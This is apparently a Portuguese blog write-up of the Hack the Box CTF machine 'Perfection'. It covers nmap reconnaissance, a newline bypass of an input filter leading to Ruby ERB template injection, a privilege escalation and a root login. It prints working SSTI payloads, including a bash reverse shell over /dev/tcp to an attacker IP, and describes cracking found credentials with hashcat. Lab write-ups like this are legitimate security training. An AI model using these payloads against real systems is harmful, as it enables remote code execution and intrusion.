---
title: "Hack the Box - Perfection"
summary: "Resolução da máquina perfection do hack the box "
tags: ["CTF", "Hack the Box"]
# externalUrl: ""
date: 2024-03-22
draft: false
showAuthor: false
authors:
  - paixao
showAuthorsBadges: false
# series: ["CTF"]
# series_order: 2
---

## 1. Introdução

Coe, aqui estara a descrição dos passos que eu junto à galera da sunsec tomamos para resolver a máquina "Perfection" do hack the box. E que depois de muita luta (principalmente no bypass do SSTI) nós conseguimos ownar.

## Reconhecimento

A princípio, utilizamos o nmap a fim de descobrir as portas sendo utilizadas e os serviços exploravei bem como suas versões

- nmap -sC -sV $target

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Após analisar o resultado do nmap, nos voltamos para a aplicação web na porta 80. Na qual seguimos mapeando, foi utilizado o wapplizer extrair informações sobre as tecnologias sendo utilizadas na página web e descobrimos que estão utilizando ruby na versão 3.0.2. Além disso, o site foi construido usando o WEBrick 1.7.0. Com tudo que foi recolhido, buscamos por exploits para explorar as versões das tanto do ruby quanto do WEBbrick mas não encontramos nada.

Continuamos vasculhando à aplicação até esbarrar no seguinte formulário:

[![Imagem do form de peso](perfection-form.png)]

Seguindo o caminho esperado pela aplicação, nós inserimos os dados necessários no formulário e obtivemos como resultado um cálculo de peso.

```
Your total grade is 12%

sample: 12%

N/A: 0%

N/A: 0%

N/A: 0%

N/A: 0%
```

Dado este output, nós percebemos que os dados que nós inserimos estão sendo processados pelo backend da aplicação e está sendo devolvido para o frontend. Com isso em mente, tentamos inserir alguns payloads de XSS/SQLI/SSTI e obtivemos a seguinte a menssagem "Malicious input blocked" então decidimos investir nesse campo. Focamos nos payloads de SSTI por se tratar de uma app escrita em ruby e esta linguagem ter um péssimo histórico com templates.

Após batermos cabeça por muito tempo usando vários payloads com os mais diversos encodes possíveis, utilizamos uma técnica de bypass por meio da quebra de linha com o seguinte payload:

```
unencoded
aa\n<%= `ls /` %>

encoded
aa%0a<%25%3d+`ls+/`+%25>
```

Feito isso, agora é possível executar comandos dentro da máquina alvo. Sendo assim tentamos pegamos uma shell reversa alterando o comando para:

```
unencoded
aa\n<%= `bash -i >& /dev/tcp/10.10.14.73/1337 0>&1` %>

encoded
aa\n<%25%3d+`bash+-i+>%26+/dev/tcp/10.10.14.73/1337+0>%261`+%25>
```

Agora dentro da máquina alvo fazemos o update da shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Vasculhando por informações, encontra-se no diretorio do usuário "susan" um sub-diretorio de migrations, e utilizando o comando strings nele algumas informação.

```
Credenciais da sunsan
```

De posse dessa credencial nós quebrabos a senha com hashcat e a utilizamos para logar como root e pegar a última flag.
